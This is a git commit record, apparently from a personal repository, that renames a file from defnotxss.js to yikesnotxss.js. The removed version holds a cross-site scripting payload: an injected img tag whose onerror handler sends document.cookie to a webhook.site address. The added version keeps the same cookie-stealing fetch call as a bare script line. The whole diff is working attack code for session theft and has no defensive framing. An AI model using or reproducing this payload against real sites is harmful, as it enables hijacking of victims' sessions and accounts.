dcb1a184a6fb5ff05ac86511259b2253bd0642af
Somnath Das <37792778+SomnathDas@users.noreply.github.com>
2024-03-06 00:09:13 +0530

    Update and rename defnotxss.js to yikesnotxss.js

--- defnotxss.js
+++
@@ -1,1 +0,0 @@
-</div><img+src=x+onerror=fetch('https://webhook.site/20242d25-a041-4bd9-96dd-651cceafa77f/'+document.cookie)/>
---
+++ yikesnotxss.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/20242d25-a041-4bd9-96dd-651cceafa77f/'+document.cookie)
